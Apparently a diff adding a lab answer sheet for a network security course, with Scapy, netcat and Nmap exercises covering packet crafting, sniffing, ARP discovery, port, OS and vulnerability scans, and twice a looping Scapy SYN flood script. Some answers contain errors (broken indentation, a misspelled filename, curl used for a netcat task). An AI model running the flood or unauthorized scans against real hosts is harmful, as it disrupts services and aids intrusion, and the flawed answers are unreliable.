@@ -1,0 +1,282 @@
+1b) Using Scapy, create a frame that consists of an Ethernet layer, with an IP layer on top? With the show method, capture all fields of the frame
+
+frame.py:
+from scapy.all import *
+myFrame = Ether()/IP()
+myFrame.show()
+
+chmod +x frame.py
+sudo python3 frame.py
+
+1c) Write a Shell script for port scan using NetCat.
+
+port_scan.sh:
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+gedit porti_scan.sh
+chmod +x port_scan.sh
+./port_scan.sh
+ex: Starting Port Number : 80, Ending Port Number: 82
+
+2b) How to Sniff with Scapy (for 10 packets and show the details of all the packets).
+
+sniff.py:
+from scapy.all import *
+packets = sniff(count = 10)
+packets.summary()
+
+chmod +x sniff.py
+sudo python3 sniff.py
+
+2c) Using NetCat, show how to Communicate with the server using 2 terminals and across systems
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Client Side:
+
+ifconfig (get current ip address)
+nc -v <ip_address> <port_number> (ex: 5000)
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+
+
+3a) Demonstrate how to perform traceroute in Scapy
+
+traceroute.py:
+from scapy.all import * 
+ans, unans = traceroute(["8.8.8.8"], maxttl=20) 
+
+chmod +x traceroute.py
+sudo python3 traceroute.py
+
+3b) Using NetCat, show the usage of HTML  Request/Response (HEAD /GET). 
+
+curl -v -l example.com
+
+3c) Using Nmap perform Ping Scan (determine which hosts are up). Also show how to scan a single IP. 
+
+nmap -sn <website_url> or <ip_address>
+
+4a) Write a python code using Scapy for creating a Network Scanner (Hint: Create an ARP packet using ARP() method )
+
+arp.py:
+from scapy.all import * 
+arp = ARP(pdst="192.168.1.0/24") 
+broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
+packet = broadcast/arp 
+ans, _ = srp(packet, timeout=1, verbose=0) 
+for sent, received in ans: 
+	print(received.psrc, received.hwsrc) 
+
+chmod +x arp.py
+sudo python3 arp.py
+
+4b) Using NetCat, show communication between browser and the server. (for plain text)
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// <server_ip>:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+
+
+4c) Using Nmap, Scan a range of IPs. Also scan an entire subnet. 
+
+nmap 192.168.1.10-20 
+nmap 192.168.1.0/24 
+
+5a) Demonstrate SYN flood attack using Scapy
+
+flood.py:
+from scapy.all import * 
+while True: 
+	send(IP(dst="target_ip")/TCP(dport=80, flags="S")) 
+
+5b) Using NetCat, show communication between browser and the server. (for an image)
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// <server_ip>:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+
+5c) Using Nmap, Scan specific ports. Also show how to scan all 65535 ports.
+
+nmap -p 22,80,443 192.168.1.1 
+nmap -p- 192.168.1.1 
+
+6b) Write a Shell script for port scan using NetCat
+
+port_scan.sh:
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+gedit porti_scan.sh
+chmod +x port_scan.sh
+./port_scan.sh
+ex: Starting Port Number : 80, Ending Port Number: 82
+
+6c) Using Nmap, scan top 1000 ports (default). Also show how to detect service version
+
+nmap -sV 192.168.1.1 
+
+7b) Using Nmap show OS detection. Also demonstrate how to perform Aggressive scan. 
+
+For OS Detection:
+nmap -O 192.168.1.10
+For Agressive Scan:
+nmap -A 192.168.1.10
+
+8a) Demonstrate how to Send ICMP packets in Scapy and show the packet captured using Wireshark to destination 8.8.8.8
+
+send(IP(dst="8.8.8.8")/ICMP()) 
+Use Wireshark to filter icmp and observe the packets.
+
+8b) Using NetCat, show communication between browser and the server (for an image).
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// <server_ip>:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+
+9a) Demonstrate how to Perform a Port Scan using Scapy tool on target www.example.com.
+
+portscan_scapy.py:
+from scapy.all import * 
+for port in range(20, 30): 
+pkt = IP(dst="www.example.com")/TCP(dport=port, flags="S") 
+resp = sr1(pkt, timeout=0.5, verbose=0) 
+if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 18: 
+	print(f"Port {port} is open") 
+
+9b) Using Nmap, Scan for vulnerabilities. Also demonstrate how to save results to a text file
+
+nmap --script vuln -oN scan_results.txt 192.168.1.1 
+
+10a) Using NetCat, show communication between browser and the server (for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// <server_ip>:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+
+10b) Using Nmap, Scan a range of IPs. Also scan an entire subnet
+
+nmap 192.168.1.10-20 
+nmap 192.168.1.0/24 
+
+11a) Create a simple network monitor that watches for ICMP packets using python function callback in Scapy
+
+from scapy.all import * 
+def icmp_monitor(pkt): 
+	if pkt.haslayer(ICMP): 
+		print("ICMP Packet:", pkt.summary()) 
+sniff(filter="icmp", prn=icmp_monitor) 
+
+11b) Using Nmap, scan the top 1000 ports (default). Also show how to detect service version
+
+nmap -sV 192.168.1.1
+
+12a) Identify hosts that are up in a local network using Scapy (hint: ARP)
+
+arp.py:
+from scapy.all import * 
+arp = ARP(pdst="192.168.1.0/24") 
+broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
+packet = broadcast/arp 
+ans, _ = srp(packet, timeout=1, verbose=0) 
+for sent, received in ans: 
+	print(received.psrc, received.hwsrc) 
+
+chmod +x arp.py
+sudo python3 arp.py
+
+12b) Using NetCat show communication between browser and the server (for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// <server_ip>:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+
+13a) Display the route and measure transit delays of packets across an IP network with Scapy (on www.example.com, www.google.com)
+
+from scapy.all import * 
+traceroute(["www.example.com", "www.google.com"]) 
+
+13b) Using NetCat, show communication between browser and the server(for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// <server_ip>:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+
+14a) Write a scapy program to carryout SYN flooding attack.
+
+flood.py:
+from scapy.all import * 
+while True: 
+	send(IP(dst="target_ip")/TCP(dport=80, flags="S")) 
+
